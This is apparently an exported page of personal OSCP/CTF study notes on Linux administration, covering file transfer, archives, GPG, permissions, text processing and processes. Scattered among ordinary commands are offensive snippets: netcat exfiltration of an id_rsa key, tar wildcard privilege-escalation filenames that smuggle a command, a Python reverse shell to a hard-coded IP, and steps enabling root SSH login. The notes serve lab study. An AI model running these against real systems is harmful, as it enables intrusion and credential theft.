<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>SysAdmin Stuff</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>SysAdmin Stuff</h1><br/><p>[OSCP 1- ]</p><p></p><p><h1>File Transfer</h1><span style="color:#ffbe6f;"></span></p><p><span style="color:#ffbe6f;"></span><span style="color:#ff0000;">Diff methods</span> of file transfer <span style="color:#ff0000;">may require diff perms</span>! For example, unable to upload via FTP but able to use <em>scp</em> (SSH).</p><p></p><p>This could be due to the fact that FTP writes to a specific dir which a user may not have access to, whereas scp can use diff destination directories<span style="color:#ffbe6f;"></span></p><p><span style="color:#ffbe6f;"></span></p><p><h2>Recursively Copy a Directory</h2></p><p><em>wget -r -np http://ATKER:8000/CVE-2021-4034 </em></p><p></p><p><h2>Using Netcat</h2></p><p><strong>{Target}</strong> <em>nc 10.2.11.116 9999 &lt; id_rsa</em></p><p></p><p><strong>{Attacker}</strong><em> nc -lvnp 9999 &gt; id_rsa</em></p><p></p><p><h2>Using Web App</h2></p><p>If target has very limited binaries, but there&#39;s a Web App that allows file uploads (with or without authentication), you may be able to use that to transfer files to the target.</p><p></p><p>From there you could upload a busyboxy static binary which would allow you to use standard methods for file transfers.</p><p></p><p><h3>Web App Renames File</h3></p><p>The Web App may rename the file that you upload, so the target may save the file as a random string of characters. In this case, it <span style="color:#ff0000;">helps to know the directory that files are saved to</span>.</p><p></p><p>You can <span style="color:#ff0000;">identify located files by comapring the file size</span> or the <span style="color:#ff0000;">file&#39;s hash</span>.</p><p></p><p><em>ls -lh FILE</em><em></em></p><p><em>sha1sum FILE</em></p><p></p><p><h2>Copy &amp; Paste Binary</h2></p><p>You can copy a file&#39;s contents from your machine &amp; paste it to the target machine. If the file is a binary there will be non-printable characters, so you&#39;ll need to encode it first.</p><p></p><p>You can output the encoded file, or use some text editors to copy the contents (vim won&#39;t copy lines to your system&#39;s clipboard). The following example sets the line-wrap, but this may be unnecessary. Next you can use a heredoc to paste it into a file on the target.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: Linux has 2 Clipboards. PRIMARY (often used with <strong>Ctrl</strong>+<strong>X </strong>&amp; <strong>Ctrl</strong>+<strong>V</strong>) and SELECTION (mouse selected text, inserted with <strong>Shift</strong>+<strong>Insert</strong> or clicking the mouse middle button).</p><p></p><p><strong>{Attacker} </strong><em>cat BINARY | base64 -w500 &gt; FILE</em></p><p></p><p><strong>{Target}</strong> <em>cat &lt;&lt; EOF &gt; FILE.base64</em> 				(e.g. Paste with SELECTION Clipboard, hit ENTER &amp; then type EOF)</p><p></p><p><strong>{Target}</strong> <em>cat FILE.base64 | base64 -d &gt; BINARY</em></p><p></p><p><h1>Compressed Data</h1></p><p><a name="Unzip"></a><h2>Unzip</h2></p><p><h3>Troubleshooting- “</h3><strong><h3>End-of-central-directory signature not found</h3></strong><h3>”</h3></p><p>&quot;Either this file is not</p><p>  a zipfile, or it constitutes one disk of a <span style="color:#ff0000;">multi-part archive</span>.  In the</p><p>  latter case the central directory and zipfile comment will be found on</p><p>  the <span style="color:#ff0000;">last disk(s) of this archive</span>&quot;</p><p></p><p>Try unzipping the last of the zipfiles stored in this location. For ex, </p><p></p><p><em>ls /opt/backup/</em></p><p><strong>sitebackup1.zip  sitebackup2.zip  sitebackup3.zip</strong></p><p></p><p><em>unzip /opt/backup/sitebackup3.zip</em></p><p></p><p><span class="subheading">Still having issues</span>:<em> jar xvf FILE.zip</em></p><p></p><p><h3>Troubleshooting- “</h3><strong><h3>skipping ... need PK compat. v5.1 (can do v4.6)</h3></strong><h3>&quot;</h3></p><p>The problem may be that the <span style="color:#ff0000;">zip file requires a password</span> &amp; this version of unzip doesn&#39;t support encryption.</p><p>You may be prompted for a password if you use 7z instead of unzip, like-</p><p></p><p><em>7z x FILE.zip</em>		(or<em> 7z x FILE.zip -aoa -p&#39;PASSWD&#39;</em>)</p><p></p><p><span class="subheading">Extract Hash</span>: Exil file to Attacker machine &amp; use <a href="Misc_Attacks--Password_Attack_5.html#zip2john">zip2john</a> with appropriate args. At the very least this will confirm that the zipfile is password protected (if you don&#39;t have 7z on target machine).</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: <span style="color:#ff0000;">Not all passwd protected zip files</span> will <span style="color:#ff0000;">give this message</span>! Instead, you may get a prompt asking for the passwd to a specific file in the archive, like-</p><p></p><p><strong>[experiment_gone_wrong.zip] system.hive password:</strong></p><p></p><p><a name="Tar"></a><h2>Tar</h2></p><p>If you want the files to be extracted to a particular destination you can add <em>-C</em> <em><strong>/destination/path/</strong></em></p><p></p><p><h3>Unpack .tar</h3><span style="color:#237522;"> File</span></p><p><em>tar xvf FILE.tar</em></p><p></p><p><h3>Unpack &amp; Decompress .tar.gz</h3></p><p><em>tar -xvzf FILE.tar.gz</em></p><p></p><p><h3>Create Compressed Archive (.tar.gz)</h3></p><p>When uploading a compressed archive to a website, you sometimes need to <span style="color:#ff0000;">make a compressed gzip archive of a directory</span> instead of just packing loose files together.</p><p></p><p><strong>-z</strong> Uses gzip compression when creating a tar file, resulting in a compressed archive with the<strong> .tar.gz </strong>extension. <strong>-c</strong> Creates an archive by bundling files and directories together. <strong>-f</strong> Specifies the filename of the archive to be created or extracted</p><p></p><p><em>tar -zcvf evil.tar.gz evil/</em></p><p></p><p><a name="Archive in PWD"></a><span class="subheading">Create Archive in PWD</span>: You can use <strong>tar</strong> to create an archive inside the same directory that it is archiving. However, to prevent infinite recursion, exclude the archive file in the list of files to be archived. You can then <a href="PrivEsc--Linux--SysAdmin_Stuff_43.html#Recursively Set Perms">Recursively Set Permissons</a>.</p><p></p><p><em>tar --exclude=&#39;./sucrack.tar.gz&#39; -zcvf sucrack.tar.gz .</em> </p><p></p><p><h2>XZ Files</h2></p><p>Often used with tar files. First extract the tar file with the following. Then use tar to decompress.</p><p></p><p><em>xz -d -v curl-linux-aarch64-musl-8.10.1.tar.xz</em></p><p><em>tar -xvf curl-linux-aarch64-musl-8.10.1.tar</em></p><p></p><p><a name="war files"></a><h2>WAR Files</h2></p><p>To view packaged files without extracting them, run the following:</p><p></p><p><em>jar tf FILE.war</em></p><p></p><p><h2>XLSX Files</h2></p><p>A zipped, XML-based excel file format created by Microsoft Excel.</p><p></p><p>Can technically unzip them as if they were a normal zip file, but this isn&#39;t normally neccesary to access them unless they&#39;re corrupted.</p><p></p><p><h3>Password Protected</h3></p><p>Apparently the <span style="color:#ff0000;">password can be easily </span><a href="https://yodalearning.com/tutorials/remove-password-from-excel-trick/">bypassed</a> (I&#39;ve never tried).</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Q</span>: If it can&#39;t be bypassed, is it possible to use a tool like <strong>zip2john</strong>? They can be unzipped normally, so can you just treat it like a zip file?</p><p></p><p><a name="Use XLSX File"></a><h3>Access with LibreOffice</h3></p><p>The LibreOffice equivalent to Excel is <strong>Calc</strong>. If you need higher privs to interact with the file, can run</p><p></p><p><em>sudo libreoffice</em></p><p></p><p><h3>Corrupted Files (Unzipping)</h3></p><p>If LibreOffice Calc can&#39;t open the XLSX properly (e.g. files is corrupted &amp; contains garbled characters), try unzipping the file &amp; viewing it manually.</p><p></p><p><em>mkdir excel; cd excel; unzip /PATH/FILE.xlsx</em><em></em></p><p><em></em><em></em></p><p><em>for i in $(find ./ -type f 2&gt;/dev/null); do echo $i; cat $i;echo -e &quot;\n\n+++++++++++++++++++++++\n&quot;;done</em></p><p></p><p><h1>Manage Users &amp; Groups</h1></p><p><h2>Users</h2></p><p><h3>List Another User&#39;s Group Memberships</h3></p><p><em>groups bob</em></p><p></p><p><h2>Groups</h2></p><p><h3>Enumerate Group Members</h3></p><p>To list the members of a group named “internal” run the following command.</p><p></p><p><em>getent group internal</em></p><p></p><p><h1>PGP / GPG</h1></p><p>[HW 55-56, 68]</p><p></p><p>Asymetric Key Cryptography that&#39;s typically used for installing or updating software.</p><p></p><p>This is because the SW files are often encrypted using the Dev&#39;s Private Key, so users can decrypted them with the Dev&#39;s Public Key (which is verified using the PGP Web of Trust). This proves that the files came from the intended author.</p><p></p><p>PGP keys are also often used for sending private messages, which are encrypted using a Public Key, that can only be decrypted by the intended recipient&#39;s Private Key. This can be used for End-to-End encryption.</p><p></p><p><h2>Decrypting Files</h2></p><p>[OSCP 231-232]</p><p></p><p>If a file was encrypted with a Public Key, you&#39;ll need to import the corresponding Private Key into a keyring to decrypt it.</p><p></p><p>It&#39;s a good idea to setup a temporary keyring for this, instead of using your normal keyring (which your system uses for things like SW verification). You can delete the temporary keyring when you&#39;re done.</p><p></p><p><h3>Identify Files</h3></p><p>You can verify that a file is PGP encrypted, or that a file is a Private Key using <strong>file</strong>. The output for these types of files may look like the following example. </p><p></p><p><em>file CustomerDetails.xlsx.gpg priv.key</em></p><p></p><p><strong>PGP RSA encrypted session key - keyid: ... (Encrypt or sign) ...</strong><strong></strong></p><p><strong>PGP Private Key block</strong></p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: Ignore the <strong>keyid</strong> that&#39;s listed for the PGP encrypted file. In this case, it was different than the keyid for the Priv Key even though this was the Priv Key needed to decrypt the file.</p><p></p><p><h3>Setup Temporary Keyring</h3></p><p>This command creates <strong>./temp_keyring.gpg</strong> as a new file. To clean-up, you can just <strong>rm ./temp_keyring.gpg</strong>.</p><p></p><p><em>gpg --no-default-keyring --keyring ./temp_keyring.gpg --import ./priv.key</em></p><p></p><p><h3>Decrypt File</h3></p><p>The file&#39;s contents will be printed to your screen, so it&#39;s a good idea to redirect the output into a new file (especially if it&#39;s in a binary format).</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: You may / may not need to specify the keyring to use for this operation.</p><p></p><p><em>gpg --decrypt ./CustomerDetails.xlsx.gpg &gt; ./CustomerDetails.xlsx</em></p><p></p><p><h3>Cracking File&#39;s Hash</h3></p><p><em>gpg2john helmet_key.txt.gpg &gt; helmet_key.hash</em></p><p></p><p><a name="Permissions"></a><h1>Permissions</h1></p><p><h2>Find Files with Permissions</h2></p><p><h3>User Permissions</h3></p><p>To check if the current user can write to a file, try the following commands. If the <strong>-writable</strong> isn&#39;t be available on your system, you can use the <strong>-perm</strong> option instead.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: <strong>-writable</strong> checks if you can write to the file for any reason, but <strong>-perm -u=w</strong> <span style="color:#ff0000;">ONLY checks if your UID</span> can write to the file &amp; <span style="color:#ff0000;">wouldn&#39;t list files that your</span> user&#39;s group (<span style="color:#ff0000;">GID</span>) <span style="color:#ff0000;">can write to</span>!</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: It may help to omit<strong> 2&gt;/dev/null</strong>. Sometimes an error may tell you valuable information (e.g. <strong>find</strong> isn&#39;t installed, you don&#39;t have the permissions to run it, etc).</p><p></p><p><em>find /path/to/search -type f -writable 2&gt;/dev/null</em><em></em></p><p><em></em><em></em></p><p><em>find /path/to/search -type f -perm -u=w 2&gt;/dev/null</em></p><p></p><p><span class="subheading">Other Commands</span>: You can also use <strong>find</strong> to check if files a readable or executable by your current user.</p><p></p><p><em>find /home -type d -readable 2&gt;/dev/null</em><em></em></p><p><em></em><em></em></p><p><em>find /path/to/search -type f -perm -u=x 2&gt;/dev/null</em></p><p></p><p><h3>Group Permissions</h3></p><p>The following command checks if a file is writable by a group (GID) that your user is in.</p><p></p><p><em>find /path/to/search -type f -perm -g=w 2&gt;/dev/null</em></p><p></p><p><span class="subheading">Check for Any Permissions</span>: The following checks if members of the group “internal” have any of the following permissions R/W/X. The <strong>-o</strong> argument acts as the logical OR operator.</p><p></p><p><em>find / -group internal \( -perm -g+r -o -perm -g+w -o -perm -g+x \) 2&gt;/dev/null</em></p><p></p><p><h3>World Permissions</h3></p><p>It doesn&#39;t seem very useful, but you can check if others can write to a file (world-writable) by using the following command.</p><p></p><p><em>find /path/to/search -type f -perm -o=w 2&gt;/dev/null</em></p><p></p><p><h2>Modify File Permissions</h2></p><p>chmod works sightly differently when run on files vs directories.</p><p></p><p><strong>chmod +s FILE</strong> sets both UID &amp; GID</p><p></p><p><strong>chmod u+s FILE</strong> sets only UID</p><p></p><p><strong>chmod g+s FILE</strong> sets only GID</p><p></p><p><h3>UID vs EUID</h3></p><p>Effective UID (EUID) is who you&#39;re impersonating, as opposed to your “Real” UID.</p><p></p><p>Therefore, even if your UID is alvin, if your EUID is root, you&#39;re operating as root.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Q</span>: Is there ever a situation where a binary will ignore your EUID &amp; only look at your “Real” UID?</p><p></p><p><span class="subheading">Check EUID</span>: If you have an EUID, it should show up with <strong>id</strong>. You can also check it with <strong>echo $EUID</strong>.</p><p></p><p><a name="Recursively Set Perms"></a><h3>Recursively Set Permissons</h3></p><p>For example, you can set the permissions for an entire tarball.</p><p></p><p><em>chmod -R 777 ./sucrack.tar.gz</em></p><p></p><p><a name="sudo privs"></a><h1>sudo Privileges</h1></p><p>See sections on <a href="PrivEsc--Linux_29.html#sudo group">sudo group</a> membership &amp; <a href="PrivEsc--Linux_29.html#Sudoers File">Sudoers file</a> configuration.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: You don&#39;t need to be in the <strong>sudo</strong> group to run <strong>sudo -l</strong></p><p></p><p>An example output for <strong>sudo -l</strong> is as follows:</p><p></p><p><strong>ALL=(ALL:ALL) ALL</strong></p><p></p><p>The first ALL is the users allowed</p><p>The second one is the hosts</p><p>The third one is the user as you are running the command</p><p>The last one is the commands allowed</p><p></p><p><h2>Root Shell via su</h2></p><p>You normally need to know a user&#39;s password to sign into their account using <strong>su</strong>. However, if an account has the ability to run <strong>sudo su</strong> you can instead provide the password that belongs to the current user.</p><p></p><p>For example, if <strong>sudo -l</strong> shows the aforementioned output (where your user is allowed to run any command as any user), you can get a root shell using the following command.</p><p></p><p><em>sudo su -</em></p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: This syntax can also be used to sign into normal user accounts, if you don&#39;t have the privileges to run the command as root (e.g. <strong>sudo su bob</strong>)</p><p></p><p><h1>Tmux</h1></p><p><h2>Restore a Session</h2></p><p>If you accidentally close tmux window while a session is running, list then re-open that session like-</p><p></p><p><em>tmux list-sessions</em><em></em></p><p><em>tmux attach -t</em> <strong>0</strong></p><p></p><p><h1>Finding a File</h1></p><p>If <em>find</em> isn&#39;t locating a file/directory as it normally should, try using -L as the 1st arg to “follow symbolic links.” Use when searching through <span style="color:#ff0000;">SecLists</span></p><p></p><p>find -L /usr/share/wordlists -iname &quot;*snmp*&quot;</p><p></p><p>Even though this directory doesn&#39;t seem to have any symbolic links, it wouldn&#39;t show up with -L?</p><p></p><p><h2>By Owner</h2></p><p>Specify either <strong>-user</strong> or<strong> -group</strong>, like-</p><p></p><p><em>find / -user kiero 2&gt;/dev/null</em></p><p></p><p><h2>Recursively Search for Text</h2></p><p><em>grep -r “password” /file/path/</em></p><p></p><p><a name="Manipulating & Comparing Text"></a><h1>Manipulating &amp; Comparing Text</h1></p><p>[OSCP 4]</p><p></p><p><h2>Extract Text from Files</h2></p><p><em>cat FILE.txt | awk -F &quot;:&quot; &#39;{print $1, $3}&#39;</em></p><p></p><p><h3>Extract 1 Value per Line from CSV File</h3></p><p>For example, if <strong>sqlmap</strong> output data from a table with 3 columns (id, username, password), there&#39;s 1 row per line in the CSV. Extract usernames with-</p><p></p><p><em>awk -F &quot;,&quot; &#39;{print $2}&#39; /home/asura/.local/share/sqlmap/output/10.10.106.75/dump/ex_DB/user.csv &gt;&gt; usernames.txt</em></p><p></p><p><h3>Extract Values from String</h3></p><p>The following extracts each person&#39;s last name by using the comma as a delimiter. The author list was taken from the Author tag via <strong>exiftool</strong>.</p><p></p><p><em>echo &quot;Sato, Jun J.; Wolsan, Mieczyslaw; Prevosti, Francisco J.; D&#39;Elía, Guillermo; Begg, Colleen; Begg, Keith; Hosoda, Tetsuji; Campbell, Kevin L.; Suzuki, Hitoshi&quot; | awk -F&#39;; &#39; &#39;{for(i=1; i&lt;=NF; i++) {split($i, name, &quot;,&quot;); print name[1]}}&#39;</em></p><p></p><p><h3>Print Values in Different Cases</h3></p><p>The previous command can be modified to print each value as is &amp; in lowercase only. You can also remove duplicate entries by appending <strong>| sort | uniq</strong></p><p></p><p><em>echo &quot;Sato, Jun J.; Wolsan, Mieczyslaw; Prevosti, Francisco J.; D&#39;Elía, Guillermo; Begg, Colleen; Begg, Keith; Hosoda, Tetsuji; Campbell, Kevin L.; Suzuki, Hitoshi&quot; | awk -F&#39;; &#39; ‘{for(i=1; i&lt;=NF; i++) {split($i, name, &quot;,&quot;); print name[1]; print tolower(name[1])}}’ | sort | uniq</em></p><p></p><p><h3>Prepending String to Wordlist</h3></p><p>For example, compromised passwords started with <strong>123adana</strong>, so you can prepend that to an existing wordlist for a Password Attack.</p><p></p><p><em>awk &#39;{print “123adana” $0}’ wordlist.txt &gt; new_list.txt</em></p><p></p><p><h3>Troubleshooting: </h3><strong><h3>invalid regexp</h3></strong></p><p>awk may misinterpret a field delimiter as regex, so you need to use <a href="https://superuser.com/questions/922370/using-space-followed-by-parenthesis-as-field-separator-in-awk">special escape syntax</a>.</p><p></p><p><h2>Find / Replace Text (sed)</h2></p><p>Adding the<strong> -i </strong>arg will make the changes, but if omitted, you&#39;ll just see a preview of what the changes would be.</p><p></p><p><h3>Special Characters</h3></p><p>If the string contains characters (i.e. / ) that would otherwise be interpretted, you can escape them with a backslash.</p><p></p><p>You need to <span style="color:#ff0000;">escape special characters</span> <span style="color:#ff0000;">even if</span> the <strong>sed</strong> argument uses <span style="color:#ff0000;">single quotes</span>!</p><p></p><p><span class="subheading">Example</span>: Editing nc mkfifo payload to change the name of the pipe so you don&#39;t disrupt current shell (remember to change port number too).</p><p></p><p><em>sed -i &#39;s/\/tmp\/f/\/tmp\/q/g&#39; shell.sh</em></p><p></p><p><a name="Comparing Text"></a><h2>Comparing Text</h2></p><p>[OSCP 4]</p><p></p><p>If you have a stable shell (i.e. SSH), it can help to pipe the output into a pager like <strong>less</strong>.</p><p></p><p><em>diff -u /tmp/baseline.sql /tmp/wp_backup.sql</em></p><p></p><p><a name="FW"></a><h1>Firewalls</h1></p><p>If target has UFW installed, simply creating an iptables rule won&#39;t be sufficient unless UFW is disabled first.</p><p></p><p><h2>UFW</h2></p><p><h3>Stop &amp; Disable on Startup</h3></p><p><em>ufw disable</em>		(as root / with sudo. Need “<a href="PrivEsc--Linux--Post-Exploit_47.html#full impersonate">full impersonation</a>” of root)</p><p></p><p><h2>iptables</h2></p><p><h3>Port Forwarding</h3></p><p>After UFW is disabled (if applicable), must setup before creating the rule. See examples for <a href="https://stackoverflow.com/questions/28170004/how-to-do-local-port-forwarding-with-iptables">Local PF</a> &amp; <a href="https://serverfault.com/questions/140622/how-can-i-port-forward-with-iptables">External PF</a></p><p></p><p><h1>Manage Processes</h1></p><p>You can manage the number or parallel processes with <a href="Appendix--Code--Shell_(Bash)_84.html#xargs">xargs</a> or <strong>parallel</strong>. See <a href="Appendix--Code--Shell_(Bash)_84.html#Broken pipe">Broken Pipe</a> Troubleshooting.</p><p></p><p><h1>Signals &amp; Manipulating Processes</h1></p><p>See this <a href="https://faculty.cs.niu.edu/~hutchins/csci480/signals.htm">list of signals</a>.</p><p></p><p><h2>Interacting with Jobs</h2></p><p>Use <strong>jobs</strong> to list suspended and background jobs along with their job numbers. Some commands will let you specify a job by listing the job number after a <strong>%</strong> .</p><p></p><p><em>jobs</em></p><p><em>kill %1</em></p><p></p><p><h2>Suspending a Process (SIGTSTP &amp; SIGSTP)</h2></p><p>NOT to be confused with <strong>SIGSTP</strong>. They work similarly, but are <a href="https://stackoverflow.com/questions/11886812/what-is-the-difference-between-sigstop-and-sigtstp">different</a>.</p><p></p><p><strong>CTRL</strong> + <strong>Z</strong> sends a <strong>SIGTSTP</strong> signal to suspend (pause) the execution of a process. It&#39;s still in the foreground but in a stopped state.</p><p></p><p><h3>Resuming Exectution</h3></p><p>You can use <strong>fg</strong> to bring a suspended job back to the foreground, so it resumes and takes over the terminal, or <strong>bg</strong> to resume it in the background.</p><p></p><p>You can also specify a particular job number if you have multiple suspended jobs (e.g. <strong>bg %1</strong>).</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: If you don&#39;t want to overburden a target, but want to run another task as soon as the current one finishes, you can suspend it with <strong>CTRL</strong> + <strong>Z</strong> &amp; run</p><p></p><p><em>fg &amp;&amp; NEW_COMMAND</em></p><p></p><p><h3>SIGTSTP vs SIGSTP</h3></p><p>Both signals are designed to suspend a process which will be eventually resumed with <strong>SIGCONT</strong>.</p><p></p><p><strong>SIGSTOP</strong> is a signal sent programmatically (eg: <em>kill -STOP pid</em> ) while <strong>SIGTSTP</strong> (for <strong>sig</strong>nal - <strong>t</strong>erminal <strong>s</strong>top) may also be sent through the tty driver by a user typing on a keyboard, usually <strong>CTRL</strong> + <strong>Z</strong>.</p><p></p><p><strong>SIGSTOP</strong> cannot be ignored. <strong>SIGTSTP</strong> might be.</p><p></p><p><h2>Background Processes</h2></p><p><span style="color:#ff0000;">Some processes can run in the background</span>, but <span style="color:#ff0000;">others may not work</span> if you background them (or you may need to set them up in a special way so they&#39;ll run properly).</p><p></p><p><h3>Sending to the Back</h3><ul><li>You can append <strong>&amp;</strong> to a command to start it in the background.</li></ul></p><p><ul><li>After suspending a job with <strong>CTRL + Z</strong>, use<strong> bg</strong> to resume a suspended job in the background. It&#39;ll continue to run, but won&#39;t take over the terminal.</li></ul></p><p></p><p><h3>Why it Doesn&#39;t Always Work</h3></p><p><span class="subheading">Processes That Can Be Run in the Background</span></p><p><ol><li><strong>Normal Command-Line Processes</strong>: Most simple commands and processes that you run in the terminal can be run in the background by appending &amp; to the command (e.g., sleep 1000 &amp;).</li></ol></p><p><ol><li><strong>Interactive Processes</strong>: Some interactive processes (like text editors, vim, or top) can also be run in the background. However, they may require special handling because they rely on terminal input/output.</li></ol></p><p></p><p>When you background them, they may still expect to interact with the terminal, which could cause issues.</p><p></p><p><span class="subheading">When Running in the Background Might Cause Problems</span></p><p><ol><li><strong>Processes That Expect Terminal Input/Output</strong>: Some processes expect to interact with the terminal (like reading input or printing output).</li></ol></p><p></p><p>If they’re backgrounded without proper handling, they might pause or misbehave because the terminal is no longer directly attached to them. For example, if you start a process like nano in the foreground, it expects user input.</p><p> </p><p>If you suspend it and try to resume it in the background with <strong>bg</strong>, you might see issues like the terminal not being able to send input to it.</p><p><ol><li><strong>Job Control and Terminal Ownership</strong>: In Linux, when you run a process in the foreground, it owns the terminal (i.e. it gets all the input and output streams from the terminal).</li></ol></p><p> </p><p>If you background it with <strong>&amp; </strong>or <strong>bg</strong>, the terminal is still technically &quot;attached&quot; to it.</p><p></p><p>This can cause certain processes to get confused or pause, especially if they are waiting for user input or if there are issues with how the terminal handles output.</p><p></p><p><span class="subheading">Common Situations Where Problems Can Occur</span></p><p><ol><li><strong>Foreground Applications</strong>: If you run an interactive application (like vim, nano, or a program requiring input) &amp; try to background it, it&#39;ll still expect user input &amp; might be confused by the lack of interaction with the terminal.</li></ol></p><p><ol><li><strong>Processes with Open File Descriptors</strong>: Some processes open files, sockets, or other resources that might not handle backgrounding smoothly. These could hang or fail when backgrounded.</li></ol></p><p></p><p><span class="subheading">How to Handle These Issues</span></p><p><ol><li><strong>Use nohup</strong>: If you want to run a command in the background and prevent it from being affected by terminal disconnections, you can use the <strong>nohup</strong> command.</li></ol></p><p></p><p>This will run the command in the background and detach it from the terminal, allowing it to keep running even if the terminal session is closed.  For example,</p><p></p><p><em>nohup your-command &amp;</em></p><p><ol><li><strong>Redirect Input/Output</strong>: When running processes that require terminal interaction, you can redirect input and output to files or other streams to avoid issues. For example:</li></ol></p><p></p><p><em>your-command &gt; output.log 2&gt;&amp;1 &amp;</em></p><p></p><p><h1>Create File with Special Characters</h1></p><p>For instance, <span style="color:#ff0000;">tar wildcard Priv Esc</span> requires that you create files with very specific names so they&#39;ll be interpretted as arguments.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: Depending on target, may need to use <strong>echo</strong> or <strong>touch</strong> method</p><p></p><p><em>echo “” &gt;./&#39;--checkpoint-action=exec=sh payload.sh&#39;</em><em></em></p><p><em></em><em></em></p><p><em>touch ./&#39;--checkpoint-action=exec=sh payload.sh&#39;</em></p><p></p><p><a name="Tar Wildcard"></a><h2>Tar Wildcard PrivEsc</h2></p><p>Navigate to the directory being backed up. If <strong>echo</strong> method doesn&#39;t work, try the aforementioned <strong>touch</strong> method.</p><p></p><p><em>echo “” &gt; ./&#39;--checkpoint=1&#39;</em></p><p></p><p><em>echo “” &gt;./&#39;--checkpoint-action=exec=sh payload.sh&#39;</em></p><p></p><p><h3>Payload</h3></p><p>Many options (e.g. if it&#39;s run by root, can modify <strong>/etc/passwd</strong> or <strong>/etc/sudoers</strong>, set SUID for <strong>/bin/bash</strong>, etc), but simplest is to create a reverse shell.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: Test from current account to make sure it works! <strong>sh payload.sh</strong></p><p></p><p><em>cat &lt;&lt; EOF &gt;&gt; payload.sh</em><em></em></p><p><em>#!/bin/bash</em><em></em></p><p><em>python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.16.56.17&quot;,7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</em><em></em></p><p><em>EOF</em></p><p></p><p><span class="subheading">Set Permissions</span>: Allow ANY user to execute the payload.</p><p></p><p><em>chmod 777 payload.sh</em></p><p></p><p><a name="root ssh"></a><h1>Enable SSH for root</h1></p><p><h2>Setup SSH Server</h2></p><p><a href="Pivoting_22.html#ssh setup">Setup SSH </a>Server on target machine as needed. Append public key to <strong>authorized_keys</strong>.</p><p></p><p><h1>Edit Config File</h1></p><p>Location of config file may vary, but def location is <strong>/etc/ssh/sshd_config</strong>. View this file to see what syntax is needed. For ex-</p><p></p><p><em>sed -i &#39;s/PermitRootLogin=no/PermitRootLogin without-password/g&#39; /etc/ssh/sshd_config</em><em></em></p><p><em>sed -i &#39;s/UsePAM yes/UsePAM no/g&#39; /etc/ssh/sshd_config</em><em></em></p><p><em>sed -i &#39;s/#PasswordAuthentication yes/PasswordAuthentication no/g&#39; /etc/ssh/sshd_config</em>					(Unneccesary?)</p><p></p><p><em>systemctl restart sshd</em>				(May use <strong>reload</strong> instead. Could be less disruptive, but may be less reliable)</p><p></p><p><h1>Switching Users (su &amp; sudo -i)</h1></p><p>If you use the <strong>-l</strong> arg (or just <strong>-</strong>) for <strong>su</strong>, it&#39;ll simulate a real login &amp; the Env is cleared except for a few select variables (i,e, TERM, DISPLAY, &amp; XAUTHORITY on some systems).</p><p></p><p>Otherwise, the Env doesn&#39;t change except for PATH, which is reset.</p><p></p><p>On Linux (may vary for some Unix-Like systems) with the <strong>shadow</strong> package providing <strong>su</strong>, if no username is specified, <strong>su</strong> will check if <strong>root</strong> has a <strong>passwd</strong> entry.</p><p></p><p>If it does, then <strong>su</strong> will use that for the username. If it doesn&#39;t, then <strong>su</strong> tries UID 0 (in case the admin account has a non-default name).</p><p></p><p>Therefore, <strong>su -l</strong> or <strong>su -</strong> will typically attempt to sign in as root &amp; clear your current user&#39;s Env.</p><p></p><p><h2>Different Creds for sudo &amp; su</h2></p><p><strong>su</strong> signs into the specified account using their credentials, but <strong>sudo</strong> lets you run a command as another user by providing your password (assuming you have the permissions to do so).</p><p></p><p>Therefore, you may be able to use the password for your CURRENT account to impersonate an account that you don&#39;t know the password for. For example, <strong>sudo /bin/bash -p</strong></p><p></p><p><a name="pidgin"></a><h1>Messaging (pidgin)</h1></p><p>[CTF B 83]</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Q</span>: proxychains pidgin kept showing <strong>denied</strong> for XMPP server, despite proxychains working with other tools. Tried again another day &amp; it worked. What changed? Just try reverting machines &amp; retrying?</p><p></p><p><h2>Account Setup</h2><h2></h2></p><p><h2></h2>When setting up an Acct, set <strong>Domain</strong> equal to email domain (e.g <strong>skylark.com</strong> for USER@skylark.com)</p><p></p><p>To modify an existing Acct, must first uncheck <strong>Enabled</strong> under <strong>Accounts</strong> (found from <strong>Buddy List</strong>: <strong>Accounts</strong> ↓ <strong>Manage Accounts</strong>).</p><p></p><p><h3>Advanced</h3></p><p>Manually specify messaging server&#39;s IP (e.g the IP for the XMPP host) with <strong>connect server</strong>.</p><p>Otherwise, pidgin may try to use a previous, no longer valid, IP.</p><p></p><p>Maybe change <strong>Connection Security</strong> &amp; also <strong>Allow Plaintext Auth</strong>...</p><p><h2></h2></p><p><h2></h2><h3>Configure Proxy</h3></p><p>Can add a proxy for an Acct to use, but I had better luck keeping it as <strong>Use Global Proxy</strong> &amp; just running</p><p></p><p><em>proxychains pidgin</em></p><p></p><p><h2>Send a Message</h2></p><p><strong>Buddy List</strong>: <strong>Buddies</strong> ↓ <strong>New Instant Message</strong></p><p></p><p><h2>Troubleshooting</h2></p><p><h3>Icon doesn&#39;t appear after running </h3><em><h3>pidgin</h3></em></p><p>Look in the top R of your screen (near the clock &amp; your VPN&#39;s IP). You should see the <span style="color:#ff0000;">icon of a message bubble</span>. <span style="color:#ff0000;">Click that to make pidgin appear</span>.</p><p></p><p><h1>Webserver</h1></p><p>python3 -m http.server 80</p><p>php -S SERVER_IP:80</p><p></p><p><h2>What&#39;s Updog?</h2></p><p><a href="https://github.com/sc0tfree/updog">updog</a> offers a python webserver expanded functionality (e.g file 